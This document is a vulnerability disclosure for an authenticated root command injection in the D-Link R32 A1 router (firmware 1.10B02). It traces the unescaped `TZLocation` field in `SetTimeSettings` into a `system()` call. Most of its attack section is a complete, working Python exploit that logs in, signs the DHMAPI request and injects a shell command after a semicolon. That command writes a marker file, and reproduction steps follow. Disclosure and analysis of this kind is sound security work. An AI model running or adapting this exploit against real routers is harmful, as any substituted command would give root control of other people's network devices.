# D-Link R32 A1 firmware 1.10B02: Authenticated command injection in `SetTimeSettings` via `TZLocation` leading to root RCE

## TARGET

- Vendor: D-Link
- Device: D-Link R32 A1 Wireless Router
- Firmware version: 1.10B02
- Firmware file: `R32A1_FW110B02.bin`
- Firmware SHA-256: `324bf9ad9a5066eed6244bb8b97a45f4ac99835d1f11606208ed6f9092ba7790`

## BUG TYPE

OS Command Injection

- Architecture: AArch64 / ARM64, little-endian
- OS: Embedded Linux; firmware kernel module directory `4.4.124`
- Web service: `usr/bin/httpd`, listening on HTTP/HTTPS and running as root
- Vulnerable endpoint: `POST /DHMAPI/`
- Vulnerable action and field: `SetTimeSettings` / `TZLocation`
- `httpd` Build ID: `8e820bb1f57fad0389a49846795227590a5f6017`

## Abstract

The D-Link R32 A1 router running firmware 1.10B02 contains an authenticated command injection vulnerability in the `SetTimeSettings` DHMAPI action. The vulnerability occurs while processing the `TZLocation` SOAP field. After extracting the original value, the handler inserts it into the unquoted command format `fota -T %s&` and executes the result through `system()` without validating it as a timezone or escaping shell metacharacters.

An attacker with a valid DHMAPI administrator session can append a semicolon and an arbitrary command to `TZLocation`. The injected command runs with root privileges. This action has a separate handler and sink from `SetDeviceSettings`; the two entry points must not be treated as the same request path. Only firmware 1.10B02 on hardware revision A1 was tested.

### Vulnerability Point

The `SetTimeSettings` action is registered with `auth=1`. Therefore, a valid DHMAPI session is required to reach this handler. An unauthenticated negative-control request returned HTTP 401 and created no marker file.

![SetTimeSettings is registered as an authenticated action](R32_A1_FW110B02_RCE_Report.assets/image-20261027160745513.png)

When the action is dispatched, `sub_45F1F0` calls `sub_45EFE0` with the parsed SOAP parameter array.

![The SetTimeSettings handler passes the parsed parameters to sub_45EFE0](R32_A1_FW110B02_RCE_Report.assets/image-20261027153635852.png)

`sub_45EFE0` walks the parameter entries and compares each field name with `TZLocation`. Once the field is found, the original value pointer is copied into `v5`. Authentication controls access to the action but does not validate the field content.

![TZLocation is selected and its original value pointer is retained](R32_A1_FW110B02_RCE_Report.assets/image-20261027153758515.png)

The value is passed to `write_csman_str(..., 458753, value)`, but the original pointer remains in use afterward. The code does not read back a validated value and performs no IANA timezone lookup, character allowlist, quoting, or `sub_416AD0` escaping on this path.

![The original TZLocation value remains in use after write_csman_str](R32_A1_FW110B02_RCE_Report.assets/image-20261027154354417.png)

At `0x45f108`, the tainted value is moved into `X5`, the first variadic argument register for `_exec_cmd`. The instructions at `0x45f10c`/`0x45f114` select `fota -T %s&`, and `0x45f124` calls `_exec_cmd`.

![TZLocation is inserted into the unquoted fota command](R32_A1_FW110B02_RCE_Report.assets/image-20261027154837126.png)

The resulting command is equivalent to:

```sh
fota -T <original TZLocation value>&
```

Finally, `libutils.so::_exec_cmd` formats the string into a 1024-byte buffer and reaches `system()` through `pox_system`. There is no filtering of `;`, `>`, newlines, or `$()`. Therefore, a semicolon ends the `fota` argument and starts a new command. The injected command executes even if `fota` itself fails.

### PoC

The following complete PoC contains the DHMAPI login, key derivation, request signing, exploit request, and marker verification in one code block. It does not import any local module or require any accompanying script. PyCryptodome is used only for the device's AES-CTR content-signature protocol.

```python
#!/usr/bin/env python3
import argparse
import base64
import hashlib
import hmac
import time
import urllib.error
import urllib.request
import xml.etree.ElementTree as ET
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

MARKER = "R32_ORIG_TIME"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def send(request):
    opener = urllib.request.build_opener(NoRedirect())
    try:
        with opener.open(request, timeout=40) as response:
            return response.status, response.read().decode(errors="replace")
    except urllib.error.HTTPError as exc:
        body = exc.read().decode(errors="replace")
        exc.close()
        return exc.code, body


def digest(key, message):
    return hmac.new(key.encode(), message.encode(), hashlib.sha256).hexdigest().upper()


def envelope(action, fields):
    body = [f"<{action}>"]
    for name, value in fields.items():
        escaped = str(value).replace("&", "&amp;").replace("<", "&lt;")
        body.append(f"<{name}>{escaped}</{name}>")
    body.append(f"</{action}>")
    return ('<?xml version="1.0" encoding="utf-8"?>'
            '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
            'xmlns:xsd="http://www.w3.org/2001/XMLSchema" '
            'xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>'
            + "".join(body) + "</soap:Body></soap:Envelope>").encode()


def content_signature(body, private_key):
    iv = get_random_bytes(16)
    cipher = AES.new(bytes.fromhex(private_key), AES.MODE_CTR,
                     nonce=b"", initial_value=iv)
    plaintext = pad(hashlib.md5(body).hexdigest().upper().encode(), 16)
    return cipher.encrypt(plaintext).hex().upper() + " " + iv.hex().upper()


class DHMAPI:
    def __init__(self, base):
        self.base = base.rstrip("/")
        self.cookie = None
        self.private_key = "withoutloginkey"

    def call(self, action, fields):
        timestamp = str(int(time.time() * 1000) % 2000000000000)
        headers = {
            "Content-Type": "text/xml; charset=utf-8",
            "Accept": "text/xml",
            "API-ACTION": action,
            "API-AUTH": digest(self.private_key, timestamp + action) + " " + timestamp,
            "Connection": "close",
        }
        if self.cookie:
            headers["Cookie"] = "uid=" + self.cookie
        body = envelope(action, fields)
        if action not in {"Login", "GetDeviceSettings"} and self.private_key != "withoutloginkey":
            headers["API-CONTENT"] = content_signature(body, self.private_key)
        request = urllib.request.Request(
            self.base + "/DHMAPI/", data=body, headers=headers, method="POST"
        )
        status, text = send(request)
        print(f"[*] {action}: HTTP {status}\n{text}")
        return status, text

    def login(self, username, password):
        status, first = self.call("Login", {
            "Action": "request", "Username": username,
            "LoginPassword": "", "Captcha": "",
        })
        if status != 200:
            raise SystemExit("[-] Login challenge failed")
        root = ET.fromstring(first)
        values = {}
        for element in root.iter():
            if element.tag in {"Challenge", "Cookie", "PublicKey", "SaltHash"}:
                values[element.tag] = element.text or ""
        for required in ("Challenge", "Cookie", "PublicKey"):
            if required not in values:
                raise SystemExit(f"[-] Missing login field: {required}")
        self.cookie = values["Cookie"]
        if values.get("SaltHash"):
            derived = hashlib.pbkdf2_hmac(
                "sha256", password.encode(), values["SaltHash"].encode(), 5000, dklen=32
            )
            password = base64.b64encode(derived).decode()
        self.private_key = digest(values["PublicKey"] + password, values["Challenge"])
        status, second = self.call("Login", {
            "Action": "login", "Username": username,
            "LoginPassword": digest(self.private_key, values["Challenge"]), "Captcha": "",
        })
        if status != 200 or "<loginresult>success</loginresult>" not in second.lower():
            raise SystemExit("[-] Login failed")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("target", nargs="?", default="http://127.0.0.1:10080")
    parser.add_argument("--username", default="Admin")
    parser.add_argument("--password", default="")
    parser.add_argument("--unauth", action="store_true")
    args = parser.parse_args()
    client = DHMAPI(args.target)
    filename = "r32_unauth_tz_proof.txt" if args.unauth else "r32_tz_proof.txt"
    if not args.unauth:
        client.login(args.username, args.password)
    status, _ = client.call("SetTimeSettings", {
        "TZLocation": f"x;echo {MARKER} >/tmp/www3/{filename}",
        "NTP": "true",
        "NTPServer": "ntp1.dlink.com",
        "ManualDaylightSaving": "false",
    })
    if args.unauth:
        marker_status, _ = send(urllib.request.Request(client.base + "/" + filename))
        if status == 401 and marker_status == 404:
            print("[+] Negative control passed: HTTP 401 and no marker")
        else:
            raise SystemExit("[-] Unexpected unauthenticated result")
        return
    if status != 200:
        raise SystemExit("[-] Exploit request failed")
    marker_status, body = send(urllib.request.Request(client.base + "/" + filename))
    print(f"[*] Marker: HTTP {marker_status}\n{body}")
    if marker_status == 200 and body.strip() == MARKER:
        print("[+] Authenticated root command execution confirmed")
    else:
        raise SystemExit("[-] Marker was not created")


if __name__ == "__main__":
    main()
```

The injected field is `<TZLocation>x;echo R32_ORIG_TIME >/tmp/www3/r32_tz_proof.txt</TZLocation>`. After shell parsing, the command following the semicolon writes the marker to the web root.

### Impact

An attacker with valid administrator credentials or access to an authenticated DHMAPI session can execute arbitrary commands as **root** without a separate privilege-escalation step. This can result in complete compromise of the router's configuration, network traffic, integrity, and availability.

### Reproduction

**Prerequisites**

1. Use D-Link R32 A1 firmware 1.10B02 with the original `usr/bin/httpd` described above.
2. Install Python 3 and PyCryptodome: `python3 -m pip install pycryptodome`.
3. Know the administrator credentials for the authorized test device. In the validated QEMU setup, `127.0.0.1:10080` is forwarded to guest port `80`.

**Reproduction Steps**

1. Copy only the complete Python code block above into `poc.py`, then run:

   ```bash
   python3 poc.py http://127.0.0.1:10080 --password 'YOUR_PASSWORD'
   ```

   Omit `--password` if the authorized test device has no administrator password.

2. The script logs in, sends the signed `SetTimeSettings` request, and reads the marker automatically. Successful reproduction ends with:

   ```text
   [+] Authenticated root command execution confirmed
   ```

**After sending the payload**

![Authenticated SetTimeSettings command execution succeeds](R32_A1_FW110B02_RCE_Report.assets/image-20261027090647286.png)

The same result was obtained with the original binary and without hooks. The following optional negative control uses a different marker filename, expects HTTP 401, and verifies that no marker is created:

```bash
python3 poc.py http://127.0.0.1:10080 --unauth
```
